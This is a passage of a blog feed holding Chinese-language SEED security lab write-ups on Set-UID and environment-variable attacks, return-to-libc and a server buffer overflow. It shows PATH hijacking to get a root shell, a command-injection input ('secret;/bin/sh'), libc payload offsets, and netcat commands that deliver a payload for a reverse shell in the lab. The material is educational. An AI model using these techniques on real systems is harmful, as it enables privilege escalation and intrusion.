href="https://blog.csdn.net/C_Ronaldo__/article/details/112506896?utm_medium=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase&depth_1-utm_source=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase" target="_blank" rel="noopener">SEEDLab Environment Variable and Set-UID Program Lab 实验报告</a></p><h3 id="Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 6: The PATH Environment Variable and Set-UID Programs"></a>Task 6: The PATH Environment Variable and Set-UID Programs</h3><p>首先，task6告诉我们在set-uid当中调用sytem()函数是很危险的，因为shell程序可能会受到环境变量的影响。</p><p>攻击逻辑是这样的，我们通过修改环境变量来针对于set-uid程序进行攻击（其实实际上是针对于set-uid程序当中的system()函数来进行的）</p><ul><li>step1</li></ul><p>首先，code进行编译运行，注意在这里为防止/bin/sh的不在set-uid当中执行的策略，我们需要</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;   system(<span class="hljs-string">"ls"</span>);   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><img src="/2021/04/11/environment-variable-and-set-uid-program/20.PNG" srcset="/img/loading.gif" alt="20"></p><ul><li>step2</li></ul><p>接下来，我们aim at如何执行自己的恶意代码而不是/bin/ls，并且能否获得root权限</p><p>第一个攻击的点在于ls命令是相对寻址的，而不是根据绝对地址来进行运行，所以可以在寻找命令的时候让解析器去找我们所想要执行的恶意代码，需要修改PATH路径，同时，为了得到root权限，我们需要由前两个lab一样呢进行reverse shell下面是具体步骤</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/22.PNG" srcset="/img/loading.gif" alt="22"></p><p>首先，在reverse shell当中，都是执行/bin/sh，通过上面命令来讲/bin/sh文件复制到<code>/home/seed/Desktop/lab3/Labsetup</code>当中，并且重命名为ls</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/23.PNG" srcset="/img/loading.gif" alt="23"></p><p>之后将相对路径加入到PATH环境变量当中，可以看到会首先寻找我的相对路径，之后再次运行task6，就可以获得root权限</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/21.PNG" srcset="/img/loading.gif" alt="21"></p><p>总结：在这一步当中，我们利用了environment variable中的PATH变量来针对ls命令进行攻击，并且通过set-uid程序获得了root权限</p><h3 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 7: The LD PRELOAD Environment Variable and Set-UID Programs"></a>Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h3><p>task7先告诉了我们LD_PRELOAD这个环境变量是用来加载用户指定的共享库的，并且是优先于其他所有的动态库的，下面来看一下具体是如何影响的以及我们能怎么利用</p><blockquote><p>动态链接器程序有一个防御机制,当进程的真实用户ID与有效用户ID不一样时,或者真实组ID与有效组ID不一致时,进程将会忽略LD_PRELOAD,LD_LIBRARY_PATH环境变量.</p></blockquote><h4 id="step-1-3"><a href="#step-1-3" class="headerlink" title="step 1"></a>step 1</h4><p>首先按照步骤建立连接库并且修改LD_PRELOAD环境变量</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/24.PNG" srcset="/img/loading.gif" alt="24"></p><h4 id="step-2-3"><a href="#step-2-3" class="headerlink" title="step 2"></a>step 2</h4><ul><li>Make myprog a regular program, and run it as a normal user.</li></ul><p><img src="/2021/04/11/environment-variable-and-set-uid-program/25.PNG" srcset="/img/loading.gif" alt="25"></p><p>此时连接到的是我们重新编译之后的库文件</p><ul><li>Make myprog a Set-UID root program, and run it as a normal user.</li></ul><p><img src="/2021/04/11/environment-variable-and-set-uid-program/26.PNG" srcset="/img/loading.gif" alt="26"></p><p>此时，结果是sleep一秒之后退出，连接到的是原来的库文件</p><ul><li><p>Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it.</p><p>  <img src="/2021/04/11/environment-variable-and-set-uid-program/27.PNG" srcset="/img/loading.gif" alt="27"></p></li></ul><p>此时，在root用户下运行会发现连接到的是重新编译后的库文件</p><ul><li><p>Make myprog a Set-UID user1 program (i.e., the owner is user1, which is another user account), export the LD PRELOAD environment variable again in a different user’s account (not-root user) and run it.<img src="/2021/04/11/environment-variable-and-set-uid-program/28.PNG" srcset="/img/loading.gif" alt="28"></p><p>  创建用户test并且在seed账户中export，此时sleep一秒之后结束程序，连接到的是原来的库文件</p><p>  而当我们是在test账户当中进行export的时候，会发现此时打印消息，连接到的是重新编译后的共享库</p><p>  <img src="/2021/04/11/environment-variable-and-set-uid-program/29.PNG" srcset="/img/loading.gif" alt="29"></p></li></ul><h4 id="step-3-3"><a href="#step-3-3" class="headerlink" title="step 3"></a>step 3</h4><p>在这一步当中，我们aim at背后的机制，可以肯定的是一定和环境变量有关，并且根据hint可以得知，有的子shell可能不会继承父shell的LD*的环境变量，所以设计思路就是在我们myprog.c文件当中打印出LD_PRELOAD的值</p><p>动态链接器防御机制</p><blockquote><p>动态链接器程序有一个防御机制,当进程的真实用户ID与有效用户ID不一样时,或者真实组ID与有效组ID不一致时,进程将会忽略LD_PRELOAD,LD_LIBRARY_PATH环境变量.</p></blockquote><ul><li>针对Make myprog a regular program, and run it as a normal user.</li></ul><p>此时myprog的实际用户是seed，而有效用户也是seed，所以此时会发生重载，并且运行myprog的shell程序会是继承父shell程序的environment variable</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/30.PNG" srcset="/img/loading.gif" alt="30"></p><ul><li>针对Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it.</li></ul><p>此时myprog的实际用户是seed，而有效用户是root，所以会忽略LD_PRELOAD（实际上执行myprog的shell进程就没有继承来自父shell的LD_PRELOAD的环境变量）</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/31.PNG" srcset="/img/loading.gif" alt="31"></p><p>后面两个实际上是同理的</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/32.PNG" srcset="/img/loading.gif" alt="32"></p><h3 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="Task 8: Invoking External Programs Using system() versus execve()"></a>Task 8: Invoking External Programs Using system() versus execve()</h3><p>这个task的target是看system()和execve()之间的区别以及调用shell的另一个危险之处？还与环境变量无关？</p><h4 id="step-1-4"><a href="#step-1-4" class="headerlink" title="step 1"></a>step 1</h4><p>在这一步当中，我们就把seed当作是Bob，所以需要做的就是运行catall文件来进行删除不属于我们权限的文件</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/33.PNG" srcset="/img/loading.gif" alt="33"></p><p>发现这个文件是没有了的，而secret这个文件有效用户为root，其他的用户权限仅为r；我们将这个文件删除了，说明在catall这个set-uid程序当中，我们以root权限执行来rm的操作，同理，我们也可以通过这个方法来获取shell权限</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/34.PNG" srcset="/img/loading.gif" alt="34"></p><h4 id="step-2-4"><a href="#step-2-4" class="headerlink" title="step 2"></a>step 2</h4><p>当我们把上面的system()函数换成execve()函数的时候，会发现</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/35.png" srcset="/img/loading.gif" alt="35"></p><p>此时无法执行多条命令，无法删除secret文件同时也不能获得root权限</p><h4 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h4><p>首先是从system()函数上来看</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/36.PNG" srcset="/img/loading.gif" alt="36"></p><blockquote><p>总结来看，调用system()的话首先运行fork,产生一个子进程,然后使用execl函数进行运行命令/bin/sh,产生一个shell程序,运行command命令,同时,将环境变量显式传递给新程序.同时在父进程中调用wait去等待子进程结束.</p><p>环境变量经过了三个阶段:</p><ol><li>进程本身拥有</li><li>fork时复制给子进程</li><li>execl函数运行时,显式赋值给新程序</li></ol></blockquote><p>在第二步中,引入了外部程序shell,而在shell中,是可以执行任何指令的,所以,我们可以执行多条指令,在设置setuid程序后,可以获取root权限.<br>而execve函数为执行一个系统调用函数</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[],<span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>;</code></pre><p>第二个参数中如果包含额外的指令,他们仍然会被视为一个参数,并非一个指令.所以才会出现:</p><blockquote><p>/bin/cat: ‘secret;/bin/sh’: No such file or directory</p></blockquote><p>的错误,secret;/bin/sh被视为了一个字符串参数.<br>system()函数违背了最小权限原则,调用了shell,而shell可以执行任意命令.以及输入验证原则,过分信任了用户的输入.所以,system()函数需要谨慎使用,推荐使用execve()函数,进行了运行程序与程序参数的分类,更安全.</p><h3 id="Task-9-Capability-Leaking"><a href="#Task-9-Capability-Leaking" class="headerlink" title="Task 9: Capability Leaking"></a>Task 9: Capability Leaking</h3><p>首先来看setuid()函数作用</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/37.PNG" srcset="/img/loading.gif" alt="37"></p><blockquote><ul><li><p>进程有root权限</p><p>  当有效用户id为root,而真实用户ID和保留用户ID为普通用户,即Set-UID进程,时,会设置有效用户ID,真实用户ID,保留用户ID为参数uid,包括设置为0,即可以通过在Set-UID程序中使用:setuid(geteuid());代码,使进程的真实用户ID,保留用户ID均为0.</p></li><li><p>进程不具有 root 权限</p><p>  若进程不具有 root 权限，那么普通用户使用 setuid() 时参数 uid 只能是自己的，没有权限设置别的数值，否则返回失败.</p></li></ul></blockquote><p>有疑问的地方在于运行setuid()函数之后不应该就没有特权了吗？</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/38.PNG" srcset="/img/loading.gif" alt="38"></p><p>修改cap_leap.c文件</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> fd;  <span class="hljs-keyword">char</span> *v[<span class="hljs-number">2</span>];  <span class="hljs-comment">/* Assume that /etc/zzz is an important system file,</span><span class="hljs-comment">   * and it is owned by root with permission 0644.</span><span class="hljs-comment">   * Before running this program, you should create</span><span class="hljs-comment">   * the file /etc/zzz first. */</span>  fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/home/seed/Desktop/lab3/Labsetup/zzz"</span>, O_RDWR | O_APPEND);          <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Cannot open /home/seed/Desktop/lab3/Labsetup/zzz\n"</span>);     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  &#125;  <span class="hljs-comment">// Print out the file descriptor value</span>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"fd is %d\n"</span>, fd);  sleep(<span class="hljs-number">1</span>);  <span class="hljs-comment">// Permanently disable the privilege by making the</span>  <span class="hljs-comment">// effective uid the same as the real uid</span>  setuid(getuid());                                  <span class="hljs-keyword">if</span> (fork())&#123; <span class="hljs-comment">/* In the parent process */</span>     <span class="hljs-built_in">close</span> (fd);     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);   &#125;<span class="hljs-keyword">else</span>   &#123;     <span class="hljs-built_in">write</span> (fd, <span class="hljs-string">"Malicious Data\n"</span>, <span class="hljs-number">15</span>);     <span class="hljs-built_in">close</span> (fd);   &#125;  <span class="hljs-comment">// Execute /bin/sh</span>  <span class="hljs-comment">// v[0] = "/bin/sh"; v[1] = 0;</span>  <span class="hljs-comment">// execve(v[0], v, 0);                             </span>&#125;</code></pre><p>之后运行可以发现已经进行了写入</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/39.PNG" srcset="/img/loading.gif" alt="39"></p><blockquote><p>这是因为,在子进程中,文件描述符fd在进入close()函数前仍然有效,此时虽然进行了setuid(getuid());进行进程的特权解除,随后的非特权进程仍然可以进行修改文件.所以应该在降低特权前运行close(fd),销毁文件描述符.</p></blockquote><h3 id="附加题"><a href="#附加题" class="headerlink" title="附加题"></a>附加题</h3><h4 id="编译challenge-c"><a href="#编译challenge-c" class="headerlink" title="编译challenge.c"></a>编译challenge.c</h4><p>gcc challenge.c -o challenge</p><h4 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h4><p>challenge.c 会读取环境变量”PWD”(当前路径,如”/home/seed/env_lab”), 然后将其中的值传给buffer. 由于程序使用了危险的函数”strcpy”, 因此如果”PWD”的长度过长，会在栈上造成溢出. 本题需要大家通过栈溢出将buffer上面的数组overflowIt的一个位置的值修改成0x01020304.<br>如果攻击成功，程序会输出”Congratulations, you pwned it!”.</p><h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><ol><li>需要创建新的文件夹, 可能需要GDB调试.</li><li>如果下课前半小时没有完成，可以找助教要一个方便调试的pwn脚本.</li></ol><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-Tasks&quot;&gt;&lt;a href=&quot;#Lab-Tasks&quot; class=&quot;headerlink&quot; title=&quot;Lab Tasks&quot;&gt;&lt;/a&gt;Lab Tasks&lt;/h2&gt;&lt;h3 id=&quot;task-1：manipulate-environment-variabl</summary>
      
    
    
    
    
    <category term="software security" scheme="http://yoursite.com/tags/software-security/"/>
    
  </entry>
  
  <entry>
    <title>Return to libc attack</title>
    <link href="http://yoursite.com/2021/03/24/Return-to-libc-attack/"/>
    <id>http://yoursite.com/2021/03/24/Return-to-libc-attack/</id>
    <published>2021-03-24T11:12:07.000Z</published>
    <updated>2021-03-31T11:52:53.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>return to libc是属于缓冲区溢出的一种攻击</p><ul><li><p>前提：此时堆栈不可执行，所以不能够将恶意代码注入到堆栈当中来进行执行</p></li><li><p>方案：将返回地址修改为现有的代码，例如<code>libc</code>库里面的<code>system()</code>函数，该函数已经加载到内存空间</p></li></ul><h2 id="Task-1-Finding-out-the-Addresses-of-libc-Functions"><a href="#Task-1-Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task 1: Finding out the Addresses of libc Functions"></a>Task 1: Finding out the Addresses of libc Functions</h2><p>既然说我们需要调用<code>system()</code>函数来帮助我们获得root shell，那么首先我们就需要来获得<code>system()</code>函数的位置，通过运行gdb来查看</p><p><img src="/2021/03/24/Return-to-libc-attack/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>以及通过batch模式下来查看</p><p><img src="/2021/03/24/Return-to-libc-attack/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>可以看到system()函数的地址是0xf7e12420，exit()函数的地址是0xf7e04f80</p><h2 id="Task-2-Putting-the-shell-string-in-the-memory"><a href="#Task-2-Putting-the-shell-string-in-the-memory" class="headerlink" title="Task 2: Putting the shell string in the memory"></a>Task 2: Putting the shell string in the memory</h2><p>这一步其实就是传参，将/bin/sh放入内存，需要的时候进行</p><p>方法：</p><p>将<code>/bin/sh</code>通过环境变量的方式来放入到内存当中，参考blog：<a href="https://blog.csdn.net/lsx2017/article/details/86104543?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161676442516780274128887%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161676442516780274128887&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-86104543.pc_search_result_no_baidu_js&utm_term=%E5%AF%BC%E5%87%BAshell%E5%8F%98%E9%87%8F%E5%92%8C%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F" target="_blank" rel="noopener">shell总结1：Shell全局变量、局部变量和环境变量</a>，之后的子shell中已经将该环境变量加入到内存当中了，通过运行prtenv和retlib来进行验证</p><p><img src="/2021/03/24/Return-to-libc-attack/3.PNG" srcset="/img/loading.gif" alt="3"></p><p>可以看到此时/bin/sh作为环境变量在内存当中的地址是0xffffd40f</p><h2 id="Task-3-Launching-the-Attack"><a href="#Task-3-Launching-the-Attack" class="headerlink" title="Task 3: Launching the Attack"></a>Task 3: Launching the Attack</h2><p>在这一步当中，我们构造badfile的payload，根据注释以及前面的信息，可以得知我们现在已经获取了所要调用的函数的地址以及参数在地址当中的位置，那么现在对于我们来说就需要知道将这些信息放在payload的什么位置/在栈中的位置</p><ul><li>首先我们的目标是调用<code>system()</code>函数，那么就需要修改bof函数的return address为<code>system()</code>的起始位置<code>0xf7e12420</code>，此时我们需要将它填到A+0x4当中</li><li>之后我们要确定<code>/bin/sh</code>所要放到的位置，通过分析执行完bof()函数之后调用<code>system()</code>函数时栈的地址，会发现此时参数/bin/sh应该放在ebp + 0xc的位置上</li><li>之后为了在/bin/sh运行之后正常退出，所以我们需要在调用完system()函数之后调用exit()函数，将system()的返回地址填充为exit()的地址</li></ul><p><img src="/2021/03/24/Return-to-libc-attack/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>可以看到buffer的起始位置和ebp之间的距离，即A和B之间的距离为0x18，所以system()相对于buffer的偏移量就是0x18 + 0x4 = 0x1c，而exit的偏移量就在0x18 + 0x8 = 0x20，/bin/sh所在位置就是0x18 + 0xc = 0x24（）</p><p><strong>因为在执行完bof函数之后，最后肯定是pop出来system()的地址并且进行跳转，此时esp所执行想的就应该是原来的ebp + 8的位置，而当我们执行system()函数的时候，第一步就是push ebp，所以相比之前的ebp，会往上移4位，然后ebp需要在return address之下，而return address需要在传入参数的下面，所以位置分别为0x18 + 0x4,0x18 + 0x8,0x18+0xc，需要深入并细致的分析汇编以及寄存器内容</strong></p><p><img src="/2021/03/24/Return-to-libc-attack/8.PNG" srcset="/img/loading.gif" alt="8"></p><p><img src="/2021/03/24/Return-to-libc-attack/5.PNG" srcset="/img/loading.gif" alt="5"></p><h3 id="Attack-variation-1"><a href="#Attack-variation-1" class="headerlink" title="Attack variation 1"></a>Attack variation 1</h3><p>在badfile中去除exit函数，在这里我们修改跳转地址就好，改为0xAAAAAAAA</p><p><img src="/2021/03/24/Return-to-libc-attack/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>之后在进行运行，会发现仍能够获取权限，但是当我们执行exit来退出的时候，会由于跳转地址而发生segmentation fault</p><h3 id="Attack-variation-2"><a href="#Attack-variation-2" class="headerlink" title="Attack variation 2"></a>Attack variation 2</h3><p>其实原理就是当我们改变名称的时候，会改变环境变量的地址，就只是会打印出消息，而不会获取root shell</p><p><img src="/2021/03/24/Return-to-libc-attack/9.PNG" srcset="/img/loading.gif" alt="9"></p><h2 id="Task-4-Defeat-Shell’s-countermeasure"><a href="#Task-4-Defeat-Shell’s-countermeasure" class="headerlink" title="Task 4: Defeat Shell’s countermeasure"></a>Task 4: Defeat Shell’s countermeasure</h2><p>这个task就是在针对于shell的解决方案，因为最开始的时候我们是将/bin/sh连接到了/bin/zsh，而不是<code>/bin/dash</code>，这是由于dash和bash会自动放弃特权，但是如果说我们增加一个选项 -p，那么命令就会变为<code>/bin/bash -p</code>，这就不会自动放弃特权，而根据提示，<code>execv()</code>可以帮助我们来执行这条命令</p><p>下面开始一步一步拆解解决问题</p><ol><li><p>首先是要获取<code>execv()</code>函数以及<code>exit()</code>函数在内存当中的地址</p><p> <img src="/2021/03/24/Return-to-libc-attack/10.PNG" srcset="/img/loading.gif" alt="10"></p><p> 所以<code>execv()</code>和<code>exit()</code>分别位于0xf7e994b0, 0xf7e04f80</p></li><li><p>把/bin/bash和-p设置为环境变量并且找到他们在内存当中的位置</p><p> <img src="/2021/03/24/Return-to-libc-attack/11.PNG" srcset="/img/loading.gif" alt="11"></p><p> 之后打印出相应的地址信息</p><p> <img src="/2021/03/24/Return-to-libc-attack/12.PNG" srcset="/img/loading.gif" alt="12"></p><p> <img src="/2021/03/24/Return-to-libc-attack/13.PNG" srcset="/img/loading.gif" alt="13"></p><p> 可以看到/bin/bash的地址是<code>0xffffd401</code>，-p的地址是<code>0xffffd515</code></p></li><li><p>之后就是分析栈上面的内容，ipad上面有，可以分析出<code>execv()</code>要放在距离buffer首地址偏移量位0x1c的地方，<code>exit()</code>要放在距离buffer首地址0x20的地方，而pastname放在0x24，argv[]数组就放在了从0x28开始的位置上，并且根据打印出来的信息，我们能够得到input[]的其实位置以及相对偏移量</p><p> <img src="/2021/03/24/Return-to-libc-attack/14.PNG" srcset="/img/loading.gif" alt="14"></p><p> 之后就是根据信息来构造payload</p></li></ol><p><img src="/2021/03/24/Return-to-libc-attack/16.PNG" srcset="/img/loading.gif" alt="16"></p><p>之后进行运行，成功获得root shell</p><p><img src="/2021/03/24/Return-to-libc-attack/15.PNG" srcset="/img/loading.gif" alt="15"></p><h2 id="Task-5-Optional-Return-Oriented-Programming"><a href="#Task-5-Optional-Return-Oriented-Programming" class="headerlink" title="Task 5 (Optional): Return-Oriented Programming"></a>Task 5 (Optional): Return-Oriented Programming</h2><p>本来我们是要在调用system函数之前调用setuid(0)，而实际上需要在bof结束之后调用10次foo，然后再调用execv()</p><p>首先，我们需要获得foo、execv以及exit在内存当中的位置分别为<code>0x565562b0,0xf7e994b0,0xf7e04f80</code></p><p><img src="/2021/03/24/Return-to-libc-attack/17.PNG" srcset="/img/loading.gif" alt="17"></p><p>之后结合栈里面信息进行修改</p><p><img src="/2021/03/24/Return-to-libc-attack/18.PNG" srcset="/img/loading.gif" alt="18"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; class=&quot;headerlink&quot; title=&quot;Overview&quot;&gt;&lt;/a&gt;Overview&lt;/h2&gt;&lt;p&gt;return to libc是属于缓冲区溢出的一种攻击&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;前提</summary>
      
    
    
    
    
    <category term="software security" scheme="http://yoursite.com/tags/software-security/"/>
    
  </entry>
  
  <entry>
    <title>Buffer Overflow Attack server</title>
    <link href="http://yoursite.com/2021/03/16/Buffer-Overflow-Attack-server/"/>
    <id>http://yoursite.com/2021/03/16/Buffer-Overflow-Attack-server/</id>
    <published>2021-03-16T12:55:50.000Z</published>
    <updated>2021-03-17T19:01:27.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Buffer-Overflow-Attack-Server-Version"><a href="#Buffer-Overflow-Attack-Server-Version" class="headerlink" title="Buffer Overflow Attack(Server Version)"></a>Buffer Overflow Attack(Server Version)</h1><h2 id="task-1：Get-familiar-with-the-shellcode"><a href="#task-1：Get-familiar-with-the-shellcode" class="headerlink" title="task 1：Get familiar with the shellcode"></a>task 1：Get familiar with the shellcode</h2><p>就是按照步骤来实现shell命令的修改，为了测试，在shellcode文件夹下面创建了temp文件</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>首先是在<code>shellcode_32.py</code>文件当中，将原来的line 2的命令修改为<code>&quot;rm /home/seed/Desktop/lab1/Labsetup/shellcode/temp        *&quot;</code>，之后运行py文件并且编译call_shellcode.c文件，运行后可以看到temp文件被删除</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/2.PNG" srcset="/img/loading.gif" alt="2"></p><p><strong>64位的和32位的命令是一样的，下面只展示成功时候的截图</strong></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/3.PNG" srcset="/img/loading.gif" alt="3"></p><h2 id="task-2：Level-1-Attack"><a href="#task-2：Level-1-Attack" class="headerlink" title="task 2：Level 1 Attack"></a>task 2：Level 1 Attack</h2><p>此时相当于是已经建立好了attacker和server之间的连接，当执行下面命令后</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>会在server端出现</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>之后，我们要通过构造<code>badfile</code>文件，让badfile来覆盖掉返回地址，使得之后返回的地址是shellcode在栈上的位置，或者指向shellcode前面的nop指令。</p><p><strong>思路：</strong>进行代码分析，首先来看<code>stack.c</code>，也就是<code>buffer overflow vulnerability</code>的代码，它的基本思路是这样的：首先，<code>main()</code>函数会开一个517个byte的局部变量<code>str[]</code>，用来存储我们所需要写入的字节，之后将str的首字节压入栈中，作为<code>dummy_function()</code>的参数，而<code>dummy_function()</code>最主要的作用就是将str首地址并调用了bof()函数，该函数的作用是开一个<code>buffer[]</code>，并且将<code>str</code>里面的内容写入到<code>buffer</code>里面。而<code>exploit.py</code>的文件内容实际上就是构造<code>badfile</code>里面的内容（将<code>content</code>写入到<code>badfile</code>），而<code>badfile</code>就是输入的东西，写入到str，之后就是<code>strcpy</code>到<code>buffer</code>并且覆盖<code>return address</code></p><p>我们已经知道了ebp的地址是<code>0xffffd318</code>，而返回地址的起始地址就是ebp + 4，就是<code>0xffffd31c</code>，距离buffer首地址0x74，就是116个byte，而shellcode随便放在返回地址上面，这里放在<code>ebp + 12</code>处，也就是0xffffd324，距离buffer首地址0x7c</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/6.PNG" srcset="/img/loading.gif" alt="6">)<img src="/2021/03/16/Buffer-Overflow-Attack-server/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>之后在主机上开一个监听端口，<code>nc -nv -l 9090</code>，然后运行exploit.py文件<code>./exploit.py</code>以及<code>cat badfile | nc 10.9.0.5 9090</code></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/8.PNG" srcset="/img/loading.gif" alt="8"></p><p>reverse shell成功</p><h2 id="task-3：Level-2-Attack"><a href="#task-3：Level-2-Attack" class="headerlink" title="task 3：Level-2 Attack"></a>task 3：Level-2 Attack</h2><p>在这个task里面，给我们的hint会变少，运行echo hello，会发现只给了Buffer的起始位置是0xffffd258，我们不知道buffer具体的大小，但是可以得知范围是在[100，300]之间，同时需要之构造一个就能够解决这个范围内所有的变化</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/9.PNG" srcset="/img/loading.gif" alt="9"></p><ul><li>针对于buffer的范围，我们选择直接将300byte来作为buffer的区域，同时，shellcode的起始位置也是可以找到的，<strong>我们选择将从buffer首地址开始到300+8都填充为我们shellcode的起始位置</strong>，偏移量308 = 0x134</li><li>针对于如何设置返回地址/shellcode的起始位置，返回地址要指向偏移量308以及之后的位置，在这里设置为了312 = 0x138，所以返回的地址就是0xffffd258 + 0x138 = 0xffffd390</li></ul><p>shellcode无需修改，仍然是这个命令，修改后的部分code如下</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/10.PNG" srcset="/img/loading.gif" alt="10"></p><p>之后按照上面的命令顺序在运行一遍，能够reverse shell，成功！</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/11.PNG" srcset="/img/loading.gif" alt="11"></p><h2 id="task-4：-Level-3-Attack"><a href="#task-4：-Level-3-Attack" class="headerlink" title="task 4： Level-3 Attack"></a>task 4： Level-3 Attack</h2><p>在这个task里面，我们的目标服务器运行的是64位的程序，首先先echo hello来看一下打印出来的信息</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/12.PNG" srcset="/img/loading.gif" alt="12"></p><p>可以看到我们能够知道buffer的起始地址以及rbp的地址，同时问题是不能出现1byte的0，否则strcpy函数就会停止复制，解决方法是既然要跳转的shellcode一定会是含有0x00，那么就直接把shellcode放在buffer里面，这样在最后strcpy的时候，会将要跳转的位置进行修改后才停止（要注意buffer的大小），在这里buffer的大小位0xd0 = 208bytes，而shellcode在这里是能够放下的</p><p>把shellcode放在buffer起始位置，然后返回地址的偏移量是0xd0 + 8 = 0xd8</p><p>之后将相应的code进行修改</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/13.PNG" srcset="/img/loading.gif" alt="13"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/14.PNG" srcset="/img/loading.gif" alt="14"></p><p>然后再按照之前命令进行运行，reverse shell成功！</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/15.PNG" srcset="/img/loading.gif" alt="15"></p><h2 id="task-5：Level-4-Attack"><a href="#task-5：Level-4-Attack" class="headerlink" title="task 5：Level-4 Attack"></a>task 5：Level-4 Attack</h2><p>思路：在这里，buffer是空间较小的，不足以放下我们的shellcode，但是需要注意的是，每次都是先将badfile作为输入写入到main里面的str的位置，然后才会去strcpy到我们的buffer里来进行覆盖返回地址，所以在这里的解决方法就是将shellcode写入到str里面，但是不strcpy到下面，而是将返回地址修改位shellcode在str里面的地址</p><p>首先，还是先echo hello</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/16.PNG" 